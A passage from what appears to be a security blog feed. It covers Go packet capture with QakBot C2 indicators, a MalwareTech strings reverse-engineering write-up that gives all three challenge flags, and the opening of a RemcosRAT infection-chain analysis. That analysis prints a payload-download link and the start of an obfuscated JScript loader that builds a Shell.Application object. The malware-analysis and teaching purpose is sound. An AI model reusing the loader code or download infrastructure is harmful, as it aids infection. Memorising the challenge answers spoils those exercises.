<p>Below is the results of filtering the captured pcap file at port 65400. For Filtering section can be any PORT or even can be left blank.</p>
<p><img data-src="/images/packets/networkcomm.png" alt="Network communication flow"></p>
<p>From the above we can confirm the IP address of the above packet matches the one in the <strong>QABOT C2 traffic IOCs</strong>.</p>
<p>Only one IP address is shown because it the only communicating in that PORT. It is also possible to filter the packet metadata and timestamp for each packet send across.</p>
<pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">QAKBOT C2 TRAFFIC:

<span class="token list punctuation">-</span> 47.158.25.67 port 443 - attempted TCP connections
<span class="token list punctuation">-</span> 45.46.53.140 port 2222 - HTTPS traffic
<span class="token list punctuation">-</span> port 443 - www.openssl.org - connectivity check (not inherently malicious)
<span class="token list punctuation">-</span> 23.111.114.52 port 65400 - TCP traffic
<span class="token list punctuation">-</span> 75.99.168.194 port 443 - HTTPS traffic<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>From above analysis, it is possible to write your own packet analysis tools and bundle them into third-party tools as plugins.</p>
<h2 id="Offensive-capabilities"><a href="#Offensive-capabilities" class="headerlink" title="Offensive capabilities"></a>Offensive capabilities</h2><p>Golang has a lot of potential in developing offensive cyber capabilities ranging from developing vulnerabilities scanners, shellcodes and encoders, proxies and fuzzing tools.</p>
<p>For this section i will focus on use of gopacket to sniff for PORT or stream.<br>This is the <strong>OpenLive</strong> function which is a wrapper to the <strong>pcapOpenLive</strong>. The function takes an argument of device, which is our interface. the interface can <strong>“eth0”</strong> for ethernet.<br>Takes a maximum size to read which is defined by snaplen.<br>if the device set by the user is not found, the functions sets its to default in which is the index 0.</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">OpenLive</span><span class="token punctuation">(</span>device <span class="token builtin">string</span><span class="token punctuation">,</span> snaplen <span class="token builtin">int32</span><span class="token punctuation">,</span> promisc <span class="token builtin">bool</span><span class="token punctuation">,</span> timeout time<span class="token punctuation">.</span>Duration<span class="token punctuation">)</span> <span class="token punctuation">(</span>handle <span class="token operator">*</span>Handle<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
 <span class="token keyword">var</span> pro <span class="token builtin">int</span>
 <span class="token keyword">if</span> promisc <span class="token punctuation">&#123;</span>
  pro <span class="token operator">=</span> <span class="token number">1</span>
 <span class="token punctuation">&#125;</span>

 p<span class="token punctuation">,</span> err <span class="token operator">:=</span> <span class="token function">pcapOpenLive</span><span class="token punctuation">(</span>device<span class="token punctuation">,</span> <span class="token function">int</span><span class="token punctuation">(</span>snaplen<span class="token punctuation">)</span><span class="token punctuation">,</span> pro<span class="token punctuation">,</span> <span class="token function">timeoutMillis</span><span class="token punctuation">(</span>timeout<span class="token punctuation">)</span><span class="token punctuation">)</span>
 <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> err
 <span class="token punctuation">&#125;</span>
 p<span class="token punctuation">.</span>timeout <span class="token operator">=</span> timeout
 p<span class="token punctuation">.</span>device <span class="token operator">=</span> device

 ifc<span class="token punctuation">,</span> err <span class="token operator">:=</span> net<span class="token punctuation">.</span><span class="token function">InterfaceByName</span><span class="token punctuation">(</span>device<span class="token punctuation">)</span>
 <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">// The device wasn't found in the OS, but could be "any"</span>
  <span class="token comment">// Set index to 0</span>
  p<span class="token punctuation">.</span>deviceIndex <span class="token operator">=</span> <span class="token number">0</span>
 <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
  p<span class="token punctuation">.</span>deviceIndex <span class="token operator">=</span> ifc<span class="token punctuation">.</span>Index
 <span class="token punctuation">&#125;</span>

 <span class="token comment">//---------continue source code-------------</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>This is a simple implementation of to show on how to capture live packets in a given port and machine.</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
 <span class="token string">"fmt"</span>

 <span class="token string">"github.com/google/gopacket"</span>
 <span class="token string">"github.com/google/gopacket/pcap"</span>
<span class="token punctuation">)</span>

<span class="token keyword">var</span> <span class="token punctuation">(</span>
 interface_point <span class="token builtin">string</span> <span class="token operator">=</span><span class="token string">"wlp4s0"</span>
 snaplen_time <span class="token builtin">int32</span> <span class="token operator">=</span> <span class="token number">1600</span>
 promiscuous <span class="token builtin">bool</span> <span class="token operator">=</span> <span class="token boolean">true</span>
<span class="token punctuation">)</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
 <span class="token comment">// Open an Interface to capture packets, with time in milliseconds</span>
 handle<span class="token punctuation">,</span> err <span class="token operator">:=</span> pcap<span class="token punctuation">.</span><span class="token function">OpenLive</span><span class="token punctuation">(</span>interface_point<span class="token punctuation">,</span> snaplen_time<span class="token punctuation">,</span> promiscuous<span class="token punctuation">,</span> pcap<span class="token punctuation">.</span>BlockForever<span class="token punctuation">)</span>
 <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
  <span class="token function">panic</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
 <span class="token punctuation">&#125;</span>
 <span class="token keyword">var</span> filter <span class="token builtin">string</span>  <span class="token operator">=</span> <span class="token string">"tcp and port 3000"</span>
 err <span class="token operator">=</span> handle<span class="token punctuation">.</span><span class="token function">SetBPFFilter</span><span class="token punctuation">(</span>filter<span class="token punctuation">)</span>
 <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
  <span class="token function">panic</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
 <span class="token punctuation">&#125;</span>
 packetSource <span class="token operator">:=</span> gopacket<span class="token punctuation">.</span><span class="token function">NewPacketSource</span><span class="token punctuation">(</span>handle<span class="token punctuation">,</span> handle<span class="token punctuation">.</span><span class="token function">LinkType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 <span class="token keyword">for</span> packet <span class="token operator">:=</span> <span class="token keyword">range</span> packetSource<span class="token punctuation">.</span><span class="token function">Packets</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">//Print captured packets</span>
  fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>packet<span class="token punctuation">)</span>
 <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="Networking"><a href="#Networking" class="headerlink" title="Networking"></a>Networking</h2><p>Golang has a lot of network packages which can be used from building tools from proxies, load balancers and scanners. This provides it an opportunity to build small utilities to help solve network issues.</p>
<p>The <strong>FindAllDevs</strong> function enumerates all the interfaces on the current machine.</p>
<p>Implementation of FindAllDevs in the pcap package</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">FindAllDevs</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>ifs <span class="token punctuation">[</span><span class="token punctuation">]</span>Interface<span class="token punctuation">,</span> err <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
 alldevsp<span class="token punctuation">,</span> err <span class="token operator">:=</span> <span class="token function">pcapFindAllDevs</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> err
 <span class="token punctuation">&#125;</span>
 <span class="token keyword">defer</span> alldevsp<span class="token punctuation">.</span><span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

 <span class="token keyword">for</span> alldevsp<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">var</span> iface Interface
  iface<span class="token punctuation">.</span>Name <span class="token operator">=</span> alldevsp<span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  iface<span class="token punctuation">.</span>Description <span class="token operator">=</span> alldevsp<span class="token punctuation">.</span><span class="token function">description</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  iface<span class="token punctuation">.</span>Addresses <span class="token operator">=</span> <span class="token function">findalladdresses</span><span class="token punctuation">(</span>alldevsp<span class="token punctuation">.</span><span class="token function">addresses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  iface<span class="token punctuation">.</span>Flags <span class="token operator">=</span> alldevsp<span class="token punctuation">.</span><span class="token function">flags</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  ifs <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>ifs<span class="token punctuation">,</span> iface<span class="token punctuation">)</span>
 <span class="token punctuation">&#125;</span>
 <span class="token keyword">return</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>From the implementation of the interface, we can parse Name, description, Addresses from the interface information of the Interface found.</p>
<p>Below is a simple program which can be used as an replacement for <strong>ipconfig</strong> in ubuntu.</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
 <span class="token string">"fmt"</span>
 <span class="token string">"log"</span>

 <span class="token string">"github.com/google/gopacket/pcap"</span>
<span class="token punctuation">)</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
 <span class="token comment">// Find all devices</span>
 devices<span class="token punctuation">,</span> err <span class="token operator">:=</span> pcap<span class="token punctuation">.</span><span class="token function">FindAllDevs</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
  log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
 <span class="token punctuation">&#125;</span>

 <span class="token comment">// Print device information</span>
 fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Devices found:"</span><span class="token punctuation">)</span>
 <span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> device <span class="token operator">:=</span> <span class="token keyword">range</span> devices <span class="token punctuation">&#123;</span>
  fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"\nName: "</span><span class="token punctuation">,</span> device<span class="token punctuation">.</span>Name<span class="token punctuation">)</span>
  fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Description: "</span><span class="token punctuation">,</span> device<span class="token punctuation">.</span>Description<span class="token punctuation">)</span>
  <span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> address <span class="token operator">:=</span> <span class="token keyword">range</span> device<span class="token punctuation">.</span>Addresses <span class="token punctuation">&#123;</span>
   fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"- IP address: "</span><span class="token punctuation">,</span> address<span class="token punctuation">.</span>IP<span class="token punctuation">)</span>
   fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"- Subnet mask: "</span><span class="token punctuation">,</span> address<span class="token punctuation">.</span>Netmask<span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>To compile the above code, run the following bash command</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">go build devices.go   //choose a suitable <span class="token keyword">for</span> you program<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>After a Successful Build, you can add the program to your environment path. Running the program outputs the following output.</p>
<p><img data-src="/images/packets/network.png" alt="Conculsion"></p>
<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>Golang net packages and gopacket library provides one ability to write network application ranging from small utilities to scanners.</p>
<blockquote>
<p>Bundle the interface scanner with a network scanner to get all the interfaces exposed in a given network range.</p>
</blockquote>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol>
<li><a href="https://twitter.com/malware_traffic/status/1513556366346137605">https://twitter.com/malware_traffic/status/1513556366346137605</a></li>
<li>Black Hat GO book (Go Programming for Hackers and pentesters) by Tom Steele, Chris Patten, and Dan Kottmann.</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>Static Analysis of Malware Strings</title>
    <url>/2021/12/07/Malware-Strings/</url>
    <content><![CDATA[<p>This post is a writeup of <strong>“strings”</strong> challenges by MalwareTech. The challenges can be downloaded from the author’s website <a href="https://www.malwaretech.com/challenges/windows-reversing">challenges</a>. <span id="more"></span></p>
<p>The goal of <strong>“strings”</strong> challenges is to understand implementation of strings in malware through static analysis. Strings are very useful in storing the configurations, decryption keys, data and C2 server addresses.</p>
<p>For analysis, I will use <code>IDApro free</code> for analysis. The author of the challenges provides a set of rules to follow while solving.</p>
<p><strong>Rules &amp; Information</strong></p>
<pre><code>- You are not require to run strings1.exe, this challenge is static analysis only.
- Do not use a debugger or dumper to retrieve the decrypted flag from memory, this is cheating.
- Analysis can be done using the free version of IDA Pro (you don’t need the debugger).
</code></pre>
<h2 id="challenge1-Strings1"><a href="#challenge1-Strings1" class="headerlink" title="challenge1- Strings1"></a>challenge1- Strings1</h2><p><code>Description</code></p>
<blockquote>
<p>strings1.exe contains an un-encrypted flag stored within the executable. When run, the program will output an MD5 hash of the flag but not the original. Can you extract the flag?</p>
</blockquote>
<p>Knowing the binary is a windows PE, drag binary into IDA for analysis. Initial analysis of the binary is fast because binary is relatively small. The disassembled code is as one shown in the image.</p>
<p><img data-src="/images/mal/strings1.png" alt="Strings IDA"></p>
<p>From the analysis of disassembled code, we take flag as input and print out md5 of the flag. The <strong>md5_hash</strong> function is responsible for calculating the MD5 hash of the flag and <code>MessageBoxA</code> is responsible for displaying the md5hash of the flag in a modal dialog box.</p>
<p>The correct flag is <strong><code>FLAG&#123;CAN-I-MAKE-IT-ANYMORE-OBVIOUS&#125;</code></strong></p>
<p>Inputting the above flag in the authors website we get a correct message.</p>
<blockquote>
<p>Correct flag for strings1!</p>
</blockquote>
<h2 id="Challenge2-Strings2"><a href="#Challenge2-Strings2" class="headerlink" title="Challenge2- Strings2"></a>Challenge2- Strings2</h2><blockquote>
<p>strings2.exe contains an un-encrypted flag stored within the executable. When run, the program will output an MD5 hash of the flag but not the original. Can you extract the flag?</p>
</blockquote>
<p>Goal of the second challenge is to understand stack strings. Stack strings is where strings are copied in single bytes at a time, this helps malware avoid detection algorithms of common strings.</p>
<p>Load second binary into IDA for analysis. The main function of the binary looks like the one shown in the image below.</p>
<p><img data-src="/images/mal/strings2.png" alt="Strings IDA"></p>
<p>From above disassembled code, the flag string is pushed in single bytes, and then passed to the md5_char function. m5_char function is responsible for calculating the MD5sum of the flag as previous seen in <code>challenge1</code>. Concatenating the bytes we get our second flag.</p>
<p>The flag is <strong><code>FLAG&#123;STACK-STRINGS-ARE-BEST-STRINGS&#125;</code></strong></p>
<h2 id="Challenge3-Strings3"><a href="#Challenge3-Strings3" class="headerlink" title="Challenge3 - Strings3"></a>Challenge3 - Strings3</h2><blockquote>
<p>strings3.exe contains an un-encrypted flag stored within the executable. When run, the program will output an MD5 hash of the flag but not the original. Can you extract the flag?</p>
</blockquote>
<p>Goal of the challenge is understanding how malware uses resources section of the PE. Drag the <code>strings3</code> binary into IDA and disassemble the main function. The disassembled code looks the one in the image below.</p>
<p><img data-src="/images/mal/resourcestrings3.png" alt="Strings IDA"></p>
<p>Looking at the above function is we have a new function, <code>FindResourceA</code>. Looking at the windows documentation, FindResourceA function is responsible determination of a resource with the specified type and name in the specified module as shown in the code snip below.</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">HRSRC FindResourceA(
  [in, optional] HMODULE hModule,
  [in]           LPCSTR  lpName,
  [in]           LPCSTR  lpType
);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>From the disassembly above, the name of the resource we are referencing is <strong>rc.rc</strong>. After the execution of FindResourceA function it returns an handle to the specified resource&#96;s information block. In x86 assembly code the return values of functions are put in <strong>eax</strong> register.</p>
<p>From the above code we can reconstruct the c-style code of the FindResource function.</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">FindResourceA</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"rc.rc"</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>The handle module is 0 which is then stored in eax register and then used for calculation of the UID of the resource as shown in assembly below.</p>
<pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm">mov <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_8<span class="token operator">]</span>, <span class="token register variable">eax</span>
mov <span class="token register variable">eax</span>, <span class="token number">1</span>
shl <span class="token register variable">eax</span>, <span class="token number">8</span>
xor <span class="token register variable">edx</span>, <span class="token register variable">edx</span>
inc <span class="token register variable">edx</span>
shl <span class="token register variable">edx</span>, <span class="token number">4</span>
or <span class="token register variable">eax</span>, <span class="token register variable">edx</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>From the above assembly code, the value of eax is 0. The first line saves eax value to a memory register.</p>
<p>Second line increments eax register value by 1. Therefore the new value of eax register is eax&#x3D;1.</p>
<p>Third line, shifts the bits value of eax register to the left by 8 times. we calculate the new value using python.</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span><span class="token number">8</span>
<span class="token number">256</span>
<span class="token operator">>></span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>value of 1 shifted to the left 8 times becomes 256 as shown above.</p>
<p>Fourth line, is we are clearing the edx register through xor operation. Therefore the value of edx is 0.</p>
<p>Line 5 we increment the value of edx by 1. The new value stored in edx register is 1, <strong>edx&#x3D;1</strong> .</p>
<p>Line 6 we shift the value of edx register by 4 positions to the left.</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span><span class="token number">4</span>
<span class="token number">16</span>
<span class="token operator">>></span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>From the calculation above, the new value od edx register is 16. <strong>edx&#x3D;16</strong>. Therefore for the last line we are doing a bitwise inclusive <strong>OR</strong> operation of value at eax and edx register.</p>
<p>The values for <code>eax</code> and <code>edx</code> registers are 256 and 16 respectively.</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token number">256</span> <span class="token operator">|</span> <span class="token number">16</span>
<span class="token number">272</span>
<span class="token operator">>></span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>The result of the bits operation are therefore stored on the eax register. The new <strong>eax</strong> value is 272. Finally the value of eax register is the stored in memory address referenced below by <strong>UID</strong></p>
<pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm">mov <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>UID<span class="token operator">]</span>, <span class="token register variable">eax</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img data-src="/images/mal/strings3.png" alt="Strings IDA"></p>
<p>The analysis of the disassembled code above, shows the binary loads a resource from the executable referenced by <code>uID</code>. The function structure for the LoadStringA functions looks like the one below.</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int LoadStringA(
  [in, optional] HINSTANCE hInstance,
  [in]           UINT      uID,
  [out]          LPSTR     lpBuffer,
  [in]           int       cchBufferMax
);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The <code>uID</code> integer value of the resource to be loaded is 272. For viewing the executable resources you can use <code>ResourcesEditor</code> tool or python3 <code>pefile</code> library as shown in the code below.</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pefile
pe <span class="token operator">=</span> pefile<span class="token punctuation">.</span>PE<span class="token punctuation">(</span><span class="token string">"./strings3.exe_"</span><span class="token punctuation">)</span>
pe<span class="token punctuation">.</span>print_info<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>The above 2 line of python3 code print all the information about the executable. As shown below is our resources section and references the string uid we are loading.</p>
<p><img data-src="/images/mal/string3rc.png" alt="PE Resources"></p>
<p>From the image above, <code>FLAG&#123;RESOURCES-ARE-POPULAR-FOR-MALWARE&#125;</code> string is loaded into the buffer through <code>LoadStringA</code> function referenced by uid <code>272</code>. The pointer to the string is then passed to md5 function which is used for calculating md5 value of the string and then displayed in the modal box.</p>
<p>The correct flag is <strong>FLAG{RESOURCES-ARE-POPULAR-FOR-MALWARE}</strong>.</p>
<p>For learning more about resource section of Portable Executable, check <a href="https://www.youtube.com/watch?v=3PcgwKffytI">PE resources</a> by <a href="https://twitter.com/struppigel">@struppigel</a> .</p>
]]></content>
      <tags>
        <tag>Malware</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>RemcosRAT Excel macro analysis</title>
    <url>/2022/01/25/REMCOSrat-Macros/</url>
    <content><![CDATA[<p>RemcosRAT is a Fileless multi-stage malware that is distributed through malicious macros in Excel files. The malware enables remote administration of infected systems to perform unintended actions. <span id="more"></span> This is a simple guide on understanding RemcosRat infection chain. The RemcosRAT infection chain can be described as shown by image <a href="https://twitter.com/Unit42_Intel/status/1478744612516900868">@Unit 42</a>.</p>
<p><img data-src="/images/mal/remcosrat/chain.jpeg" alt="Infection Chain"></p>
<p>The infection chain start through phishing of the targets through mail services and the final payload of the infection chain is the used for communicating through TCP port 10174 as shown in the image.</p>
<p>The samples and IOC can be downloaded from malware-traffic-analysis website <a href="https://www.malware-traffic-analysis.net/2022/01/04/index.html">RemcosRat sample</a>.</p>
<h2 id="Pcap-Analysis"><a href="#Pcap-Analysis" class="headerlink" title="Pcap Analysis"></a>Pcap Analysis</h2><p><a href="https://twitter.com/malware_traffic/status/1478755988023001089">Brad</a> has provided infection traffic pcap of the malware samples in his website.</p>
<p><img data-src="/images/mal/remcosrat/http_filter.png" alt="Http filter"></p>
<p>Image above shows a Filter of <strong>http</strong> traffic in wireshark used for downloading further executables into infected machine.The malware gets additional samples using <strong>GET</strong> method as highlighted.</p>
<p>From the tweet provided by <strong>unit42intel</strong>, the above link of the onedrive downloads a <code>VBS</code> file. The vbs file is not available in the onedrive at the time of writting but it is provided in malware-traffic-analysis website.</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Object moved<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>
      Object moved to
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span>
        <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://onedrive.live.com/download?cid=64F8294A00286885<span class="token entity named-entity" title="&amp;">&amp;amp;</span>resid=64F8294A00286885%21770<span class="token entity named-entity" title="&amp;">&amp;amp;</span>authkey=ABI3zrc6BsVUKxU<span class="token punctuation">"</span></span>
        <span class="token punctuation">></span></span>here<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span>
      <span class="token punctuation">></span></span>.
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Verify the sha256 hash of the <code>misc.vbs</code> matches the one provided in IOCs of Remcos Rat.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">@remcosrat$ shasum -a <span class="token number">256</span> misc.vbs
95c0a9e6463a2eb1bbfe3198cd4b6cd74927a209ca4ab17501c2f444494f4499  misc.vbs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h2 id="Stage2-Downloader-atcn-jpg"><a href="#Stage2-Downloader-atcn-jpg" class="headerlink" title="Stage2 - Downloader (atcn.jpg)"></a>Stage2 - Downloader (atcn.jpg)</h2><p>Right click the <code>GET /atcn.jpg</code> url in wireshark and follow the <strong>http</strong> stream. The HTTP streams of the urls accessed by the malware as shown below.</p>
<p><img data-src="/images/mal/remcosrat/stage1_stream.png" alt="url wireshark"></p>
<p>Malware is executing a powershell script which is obsfuscated. For further analysis we can export all the http objects. To export http objects, click <code>File -&gt; Export Objects -&gt; HTTP</code> in wireshark. select saveall to download all the http objects in malware connection traffic.</p>
<p><img data-src="/images/mal/remcosrat/exported_http.png" alt="Export Http objects "></p>
<p>The downloaded files as are not images as the extensions suuggests to. They are ASCCII text files.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">file</span> atcn.jpg
atcn.jpg: ASCII text, with very long lines <span class="token punctuation">(</span><span class="token number">4130</span><span class="token punctuation">)</span>, with CRLF line terminators
$ <span class="token function">file</span> calient.jpg
calient.jpg: ASCII text, with very long lines <span class="token punctuation">(</span><span class="token number">65536</span><span class="token punctuation">)</span>, with no line terminators<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>Below is the obfuscated powershell script.</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>xsl<span class="token operator">:</span>stylesheet version<span class="token operator">=</span><span class="token string">"1.0"</span>
      <span class="token literal-property property">xmlns</span><span class="token operator">:</span>xsl<span class="token operator">=</span><span class="token string">"http://www.w3.org/1999/XSL/Transform"</span>
      <span class="token literal-property property">xmlns</span><span class="token operator">:</span>msxsl<span class="token operator">=</span><span class="token string">"urn:schemas-microsoft-com:xslt"</span>
      <span class="token literal-property property">xmlns</span><span class="token operator">:</span>user<span class="token operator">=</span><span class="token string">"http://mycompany.com/mynamespace"</span><span class="token operator">></span>

 <span class="token operator">&lt;</span>msxsl<span class="token operator">:</span>script language<span class="token operator">=</span><span class="token string">"JScript"</span> <span class="token keyword">implements</span><span class="token operator">-</span>prefix<span class="token operator">=</span><span class="token string">"user"</span><span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token constant">CDATA</span><span class="token punctuation">[</span>


<span class="token keyword">var</span> r <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ActiveXObject</span><span class="token punctuation">(</span><span class="token function">x0asd44</span><span class="token punctuation">(</span><span class="token string">"5368656c6c2e4170706c69636174696f6e"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

